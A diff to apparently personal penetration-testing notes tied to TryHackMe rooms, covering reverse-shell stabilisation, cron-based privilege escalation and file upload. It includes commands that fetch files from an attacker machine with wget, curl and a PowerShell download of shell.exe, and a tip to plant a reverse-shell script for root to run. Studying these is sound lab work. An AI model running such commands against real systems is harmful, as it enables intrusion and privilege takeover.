@@ -136,7 +136,6 @@
 -  ctr + z = back to our shel
 -  stty raw -echo; fg = back to reverse shell
 
-
 # Privilege Escalation
 - https://tryhackme.com/room/introtoshells
 - https://tryhackme.com/room/linprivesc
@@ -176,7 +175,6 @@
 - find script with root privilege
 - /etc/crontab
 - check if file has no fullpath + create own script with reverse shell
-- 
 
 ## PATH
 - echo $PATH
@@ -213,8 +211,8 @@
 # Uploading Files
 - Option 1 - starting local server
   1. python3 -m http.server 8000
-  2. wget attacker-machine:8000:file.ext
-  3. curl attacker-machine:8000:file.ext
+  2. wget attacker-machine:8000/file.ext
+  3. curl attacker-machine:8000/file.ext
   4. [Powershell] powershell **Invoke-WebRequest -Uri** http://10.9.1.255:80/shell.exe **-Outfile** file.exe
   5. make executable: chmod +x file.ext
 
